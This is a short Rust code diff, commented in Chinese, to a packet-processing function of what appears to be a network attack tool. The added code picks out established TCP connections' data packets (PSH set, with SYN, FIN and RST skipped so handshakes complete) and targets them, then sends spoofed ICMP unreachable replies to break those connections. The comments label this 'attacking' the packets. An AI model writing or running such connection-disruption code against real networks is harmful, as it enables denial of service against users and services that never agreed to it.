@@ -73,6 +73,29 @@ fn process_packet(tx: &mut Box<dyn DataLinkSender>, packet: &[u8]) {
         None => return,
     };
 
+    // 过滤：只攻击已建立连接的数据包，忽略握手包
+    let flags = tcp_packet.get_flags();
+    let is_syn = (flags & 0x02) != 0;  // SYN 标志
+    let is_fin = (flags & 0x01) != 0;  // FIN 标志
+    let is_rst = (flags & 0x04) != 0;  // RST 标志
+    let is_psh = (flags & 0x08) != 0;  // PSH 标志（有数据）
+    
+    // 如果是握手包或结束包，不攻击
+    if is_syn || is_fin || is_rst {
+        return;
+    }
+    
+    // 只攻击带数据的包（PSH 标志），让纯 ACK 包通过
+    // 这样不会干扰握手的最后一个 ACK
+    if !is_psh {
+        return;
+    }
+    
+    // 只攻击数据传输阶段的包（PSH+ACK）
+    println!("🎯 检测到数据包: {}:{} -> {}:{}", 
+        src_ip, tcp_packet.get_source(), 
+        dst_ip, tcp_packet.get_destination());
+    
     send_icmp_unreachable(tx, src_ip, dst_ip, dst_mac, src_mac, &ip_packet, &tcp_packet);
 }
 
